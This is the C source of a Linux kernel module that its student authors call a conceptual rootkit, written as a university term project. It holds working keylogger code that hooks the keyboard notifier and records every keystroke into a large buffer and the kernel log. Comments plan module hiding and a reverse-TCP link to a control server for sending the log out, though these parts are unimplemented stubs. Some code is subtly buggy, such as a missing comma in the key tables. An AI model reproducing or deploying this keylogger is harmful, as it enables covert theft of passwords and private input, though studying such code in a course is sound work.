/**
 * Project:
 *   + A conceptual rootkit developed as a term project.
 *   + COSC 439, Towson University
 *   + Taught by Shiva Azadegan
 *
 * Usage:
 *   START: $> insmod rootkit.ko
 *   STOP : $> rmmod rootkit
 * 
 * Authors:
 *   + Zachary Brown
 *   + Kevin Hoganson
 *   + Alexander Slonim
**/
#include <linux/semaphore.h>
#include <linux/keyboard.h>
#include <linux/syscalls.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fcntl.h>
#include <linux/init.h>

#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */

#define SHIFT_ENABLED  1				/* Shift key is enabled.  */
#define SHIFT_DISABLED 0				/* Shift key is disabled. */

/**
 * KEYLOGGER FUNCTIONALITY
**/
char keyboard_buffer[KEYBOARD_BUFFER_SIZE];
int  keyboard_index;
int  shift_state;
int  caps_state ;


/**
 * NETWORK LISTENING FUNCTIONALITY
**/
struct task_struct *net_thread;


/**
 * Correlates with the key definitions found in:
 * /usr/include/linux/input.h
**/
char *letters[] = 
{
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
	"o", "p", "[", "]", "ENTER", "LCTRL", "a", "s", "d", "f", "g", "h",
	"j", "k", "l", ";", "'", "`", "LSHIFT", "\\", "z", "x", "c", "v", "b",
	"n", "m", ",", ".", "/", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};

/**
 * Can be used for uppercase lettering. In other words:
 * Use this whenever SHIFT is enabled.
**/
char *shift_letters[] = 
{
	"RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
	"_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
	"O", "P", "{", "}", "ENTER", "LCTRL", "A", "S", "D", "F", "G", "H",
	"J", "K", "L", ":", "\"", "~", "LSHIFT", "|", "Z", "X", "C", "V", "B",
	"N", "M", "<", ">", "?", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};

/**
 * TODO: 
 *   - Send keyboard buffer to control server. 
**/
int notification(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	char   *buffer;
	char   *key;
	char   c ;
	int    i;

	// 83 character values are registered above (letters). 
	if (code == KBD_KEYCODE && param->value <= 83)
	{
		// If the key is Left or Right Shift.
		if (param->value == 42 || param->value == 54)
		{
			if (param->down > 0) shift_state = SHIFT_ENABLED;
			else 				 shift_state = SHIFT_DISABLED;

			return NOTIFY_OK;
		}

		if (param->down)
		{
			// If the shift key is being held down.
			if (shift_state) 
			{
				printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", shift_letters[param->value]);
				key = shift_letters[param->value];
			}

			else
			{
				printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", letters[param->value]);
				key = letters[param->value];
			}

			// Add each letter in the string returned by key_notifier to the buffer. 
			buffer = keyboard_buffer;
			for (i = 0; i < strlen(shift_letters[param->value]); i++)
			{
				c = key[i];
				// Test if keyboard_buffer is full.
				if (keyboard_index < KEYBOARD_BUFFER_SIZE)
					buffer[keyboard_index++] = c;

				/**
				 * TODO:
				 *   + Send keyboard buffer to control server. 
				**/
				// CUrrently flushes the keyboard buffer.
				else
				{
					memset(&keyboard_buffer, '0', KEYBOARD_BUFFER_SIZE);
					keyboard_index = 0;
					buffer[keyboard_index++] = c;
				}
			}
		}
	}

	return NOTIFY_OK;
}

static struct notifier_block nb =
{
	.notifier_call = notification
};


/**
 * TODO:
 *   - Add network-listening functionality.
 *   - Filter out "ACK" numbers from TCP packets.
**/
int start_listen(void *args)
{
	printk("This prints.\n");

	return 0;
}


/**
 * TODO:
 *   - Hide the module:
 *     + Option1:  Overwrite "lsmod"
 *     + Option2:  Delete module listing "rootkit" from modules.
 *   - Configure rootkit to be a client.
 *     + Will connect to the control-server on the 192.168.1.0/24 subnet.
 *     + This connection is, thus, a reverse-TCP connection.
**/
int start(void)
{
	printk("Rootkit started.\n");

	printk("Registering keyboard notifier.\n");
	register_keyboard_notifier(&nb);
	keyboard_index = 0;

	printk("Starting network-listening thread.\n");
	net_thread = kthread_create(start_listen, NULL, "network_listener");
	wake_up_process(net_thread);

	printk("Stopping network-listening thread.\n");
	kthread_stop(net_thread);
	printk("Network-listening thread stopped.\n");

	return 0;
}

void stop(void)
{
	printk("Unregistering keyboard notifier.\n");
	unregister_keyboard_notifier(&nb);
	printk("Keyboard notifier unregistered.\n"); 

	printk("Rootkit stopped.\n");
}

module_init(start);
module_exit(stop);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kevin Hoganson - khogan8@students.towson.edu");
MODULE_AUTHOR("Zachary Brown  - zbrown4@students.towson.edu");
MODULE_AUTHOR("Alex Slonim    - a.slonim412@gmail.com");
MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC 439.");